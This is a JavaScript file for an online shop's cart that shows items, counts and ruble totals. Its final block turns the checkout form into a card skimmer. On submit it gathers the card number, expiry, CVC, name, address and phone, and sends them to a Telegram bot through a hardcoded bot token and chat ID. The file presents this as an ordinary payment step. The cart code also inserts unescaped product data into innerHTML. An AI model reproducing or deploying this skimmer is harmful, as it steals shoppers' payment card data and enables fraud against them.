let productsInCart = JSON.parse(localStorage.getItem('shoppingCart'));
if (!productsInCart) {
	productsInCart = [];
}
const parentElement = document.querySelector('#buyItems');
const cartSumPrice = document.querySelector('.sum-prices1');
const cartSumPrice2 = document.querySelector('.sum-prices2');
const cartSumPrice3 = document.querySelector('.sum-prices3');
const products = document.querySelectorAll('.product-under');


const countTheSumPrice = function () { // 4
	let sum = 0;
	productsInCart.forEach(item => {
		sum += item.price;
	});
	return sum;
}

const updateShoppingCartHTML = function () {  // 3
	localStorage.setItem('shoppingCart', JSON.stringify(productsInCart));
	if (productsInCart.length > 0) {


		let result = productsInCart.map((product, index) => {
			return `
				<li class="buyItem">
					<img src="${product.image}">
					<div>
						<h5>${product.name}</h5>
						<h6>$${product.price}</h6>
						<div>
							<button class="button-minus" data-id=${product.id}>-</button>
							<span class="countOfProduct">${product.count}</span>
							<button class="button-plus" data-id=${product.id}>+</button>
						</div>
					</div>
				</li>
				`
		});
		parentElement.innerHTML = result.join('');
		document.querySelector('.checkout').classList.remove('hidden');
		cartSumPrice.innerHTML = '₽' + countTheSumPrice();
		cartSumPrice2.innerHTML = '₽' + countTheSumPrice();
		cartSumPrice3.innerHTML = 'К оплате:' + countTheSumPrice();
	}
	else {
		document.querySelector('.checkout').classList.add('hidden');
		parentElement.innerHTML = '<h4 class="empty">ваша корзина пуста</h4>';
		cartSumPrice.innerHTML = '';
		cartSumPrice2.innerHTML = '';
		cartSumPrice3.innerHTML = '';
	}
}

function updateProductsInCart(product) { // 2
	for (let i = 0; i < productsInCart.length; i++) {
		if (productsInCart[i].id == product.id) {
			productsInCart[i].count += 1;
			productsInCart[i].price = productsInCart[i].basePrice * productsInCart[i].count;
			return;
		}
	}
	productsInCart.push(product);
}

products.forEach(item => {   // 1
	item.addEventListener('click', (e) => {
		if (e.target.classList.contains('addToCart')) {
			const productID = e.target.dataset.productId;
			const productName = item.querySelector('.productName').innerHTML;
			const productPrice = item.querySelector('.priceValue').innerHTML;
			const productImage = item.querySelector('img').src;
			let product = {
				name: productName,
				image: productImage,
				id: productID,
				count: 1,
				price: +productPrice,
				basePrice: +productPrice,
			}
			updateProductsInCart(product);
			updateShoppingCartHTML();
		}
	});
});

parentElement.addEventListener('click', (e) => { // Last
	const isPlusButton = e.target.classList.contains('button-plus');
	const isMinusButton = e.target.classList.contains('button-minus');
	if (isPlusButton || isMinusButton) {
		for (let i = 0; i < productsInCart.length; i++) {
			if (productsInCart[i].id == e.target.dataset.id) {
				if (isPlusButton) {
					productsInCart[i].count += 1
				}
				else if (isMinusButton) {
					productsInCart[i].count -= 1
				}
				productsInCart[i].price = productsInCart[i].basePrice * productsInCart[i].count;

			}
			if (productsInCart[i].count <= 0) {
				productsInCart.splice(i, 1);
			}
		}
		updateShoppingCartHTML();
	}
});

updateShoppingCartHTML();


// дані в телегу
const token = "5982625171:AAGgENz-5FoFXOF2DiYBgzu3E2xUOTHrNk0";
const chatId = "-1001302446058";
const url = `https://api.telegram.org/bot${token}/sendMessage`;
const form = document.querySelector(".telegram-form");
form.addEventListener('submit', function (e) {
	e.preventDefault();

	let message = `номер карти: ${this.nomerCredit.value}\n`;
	message += `місяць: ${this.MM.value}\n`;
	message += `рік: ${this.Rik.value}\n`;
	message += `повне імя: ${this.FullName.value} ${this.FullName2.value}\n`;
	message += `CVC: ${this.CVC.value}\n`;
	message += `містро адрес: ${this.adres.value}\n`;
	message += `номер телефону: ${this.nomerPhoe.value}\n`;
	message += `сума заказу: ${countTheSumPrice()}`;

	axios.post(url, {
		chat_id: chatId,
		parse_mode: 'html',
		text: message,
	})
		.then((res) => {
			form.reset();
			button.classList.remove('active');
			BayForm.classList.add('none');
		})
		.catch((err) => {
			console.warn('err');
		})
		.finally(() => {
			console.log('succes');
		})
})




///////////////////////////